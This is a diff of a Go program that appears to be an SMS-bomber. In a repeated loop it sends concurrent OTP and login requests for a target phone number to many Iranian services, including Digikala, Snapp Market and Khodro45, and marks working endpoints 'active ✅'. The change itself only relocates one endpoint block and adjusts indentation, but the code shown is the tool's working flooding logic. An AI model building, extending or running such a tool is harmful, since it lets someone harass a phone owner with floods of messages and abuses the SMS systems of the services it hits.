@@ -154,7 +154,7 @@ func main() {
 	ch := make(chan int, repeatCount*40)
 
 	for i := 0; i < repeatCount; i++ {
-// core.gapfilm.ir (JSON)
+                // core.gapfilm.ir (JSON)
 		wg.Add(1)
 		go sendJSONRequest(ctx, "https://core.gapfilm.ir/api/v3.2/Account/Login", map[string]interface{}{
 			"PhoneNo": phone,
@@ -275,7 +275,6 @@ func main() {
 		go sendJSONRequest(ctx, fmt.Sprintf("https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=%v", phone), map[string]interface{}{
 			"cellphone": phone,
 		}, &wg, ch)  // active ✅
-
 		// digikala.com (JSON)
 		wg.Add(1)
 		go sendJSONRequest(ctx, "https://api.digikala.com/v1/user/authenticate/", map[string]interface{}{
@@ -301,11 +300,6 @@ func main() {
 		go sendJSONRequest(ctx, "https://api.komodaa.com/api/v2.6/loginRC/request", map[string]interface{}{
 			"phone_number": phone,
 		}, &wg, ch)  // active ✅
-		// khodro45.com (JSON)
-		wg.Add(1)
-		go sendJSONRequest(ctx, "https://khodro45.com/api/v2/customers/otp/", map[string]interface{}{
-			"mobile": phone,
-		}, &wg, ch)
 		// ssr.anargift.com auth (JSON)
 		wg.Add(1)
 		go sendJSONRequest(ctx, "https://ssr.anargift.com/api/v1/auth", map[string]interface{}{
@@ -353,6 +347,11 @@ func main() {
 		wg.Add(1)
 		go sendJSONRequest(ctx, "https://sandbox.sibirani.com/api/v1/developer/generator-inv-token", map[string]interface{}{
 			"username": phone,
+		}, &wg, ch)
+		// khodro45.com (JSON)
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://khodro45.com/api/v2/customers/otp/", map[string]interface{}{
+			"mobile": phone,
 		}, &wg, ch)		
                 // tap33.me v2/user (JSON - adjusted payload format)
 		wg.Add(1)
